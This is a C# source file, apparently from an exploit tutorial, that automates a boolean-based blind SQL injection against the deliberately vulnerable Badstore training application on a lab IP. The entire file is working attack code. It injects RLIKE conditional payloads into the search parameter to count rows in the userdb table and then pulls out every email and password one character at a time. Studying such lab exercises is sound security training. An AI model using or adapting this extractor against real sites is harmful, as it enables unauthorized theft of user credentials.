using System;
using System.Text;
using System.Collections.Generic;
using System.IO;
using System.Net;

// Performs a boolean blind exploit on Badstore DB
// Note that this exploit takes time... A lot of time

namespace ExploitTut0
{
    class BooleanExploit
    {
        static void Main(string[] args)
        {
           // Count length is the number of rows in Badstore database

           int countLength = 1;
           for(;;countLength++)
           {
               string getCountLength = "fdsa' RLIKE (SELECT (CASE WHEN ((SELECT";
               getCountLength += " LENGTH(IFNULL(CAST(COUNT(*) AS CHAR),0x20)) FROM";
               getCountLength += " userdb)=" + countLength + ") THEN 0x28 ELSE 0x41 END))";
               getCountLength += " AND 'LeSo'='LeSo";

               string response = MakeRequest(getCountLength);

               if(response.Contains("parentheses not balanced")) { break; }
           }   

           // countBytes is the digits of the number of rows in terms of bytes
           // i.e. if # of rows is 23, then countBytes is {(byte)2, (byte)3}

           List<byte> countBytes = new List<byte>();
           for(int i = 1; i <= countLength; i++)
           {
               for (int c = 48; c <= 58; c++)
               {
                   string getCount = "fdsa' RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT";
                   getCount += " IFNULL(CAST(COUNT(*) AS CHAR), 0x20) FROM userdb),";
                   getCount += i + ", 1))=" + c + ") THEN 0x28 ELSE 0x41 END)) AND '";
                   string response = MakeRequest(getCount);

                   if(response.Contains("parentheses not balanced"))
                   {
                       countBytes.Add((byte)c);
                       break;
                   }

               }

           }
            
            int count = int.Parse(Encoding.ASCII.GetString(countBytes.ToArray()));
            Console.WriteLine("There are " + count + " rows in the userdb table");

            // For each row in database, get email and password

            for(int row = 0; row < count; row++)
            {
                foreach(string column in new string[] {"email", "passwd"})
                {
                    Console.Write("Getting length of query value... ");
                    int valLength = GetLength(row, column);
                    Console.WriteLine(valLength);

                    Console.Write("Getting value... ");
                    string value = GetValue(row, column, valLength);
                    Console.WriteLine(value);
                }
            }

        }

        // Method to create url with payload and process exploitative request

        private static string MakeRequest(string payload)
        {
            string url = "http://192.168.56.100/cgi-bin/badstore.cgi?searchquery=";
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url + payload + "&action=search");

            string response = string.Empty;
            using (StreamReader rdr = new StreamReader(request.GetResponse().GetResponseStream()))
            {
                response = rdr.ReadToEnd();
            }

            return response;
        }

        // Gets the length of emails and passwords

        private static int GetLength(int row, string column)
        {
            int countLength = 0;
            for(;; countLength++)
            {
                string getCountLength = "fdsa' RLIKE (SELECT (CASE WHEN ((SELECT";
                getCountLength += " LENGTH(IFNULL(CAST(CHAR_LENGTH(" + column + ") AS";
                getCountLength += " CHAR),0x20)) FROM userdb ORDER BY email LIMIT ";
                getCountLength += row + ",1)=" + countLength + ") THEN 0x28 ELSE 0x41 END)) AND";
                getCountLength += " 'YIye'='YIye";
                string response = MakeRequest(getCountLength);
                if(response.Contains("parentheses not balanced")) { break; }
            }

            List<byte> countBytes = new List<byte>();
            for(int i = 0; i <= countLength; i++)
            {
                for(int c = 48; c <= 58; c++)
                {
                    string getLength = "fdsa' RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT";
                    getLength += " IFNULL(CAST(CHAR_LENGTH(" + column + ") AS CHAR),0x20) FROM";
                    getLength += " userdb ORDER BY email LIMIT " + row + ",1)," + i;
                    getLength += ",1))=" + c + ") THEN 0x28 ELSE 0x41 END)) AND 'YIye' = 'YIye";
                    string response = MakeRequest(getLength);
                    if(response.Contains("parentheses not balanced"))
                    {
                        countBytes.Add((byte)c);
                        break;
                    } 
                }
            }

            if(countBytes.Count > 0) 
            { return int.Parse(Encoding.ASCII.GetString(countBytes.ToArray())); }
            else
            { return 0; }
        }

        // Gets the actual email and password

        private static string GetValue(int row, string column, int length)
        {
            List<byte> valBytes = new List<byte>();
            for(int i = 0; i <= length; i++)
            {
                for(int c = 32; c <= 126; c++)
                {
                    string getChar = "fdsa' RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT";
                    getChar += " IFNULL(CAST(" + column + " AS CHAR), 0x20) FROM userdb ORDER BY";
                    getChar += " email LIMIT " + row + ",1)," + i + ",1))=" + c + ") THEN 0x28 ELSE 0x41";
                    getChar += " END)) AND 'YIye' = 'YIye";

                    string response = MakeRequest(getChar);
                    if(response.Contains("parentheses not balanced"))
                    {
                        valBytes.Add((byte)c);
                        break;
                    }
                }
            }

            return Encoding.ASCII.GetString(valBytes.ToArray());
        }
    }
}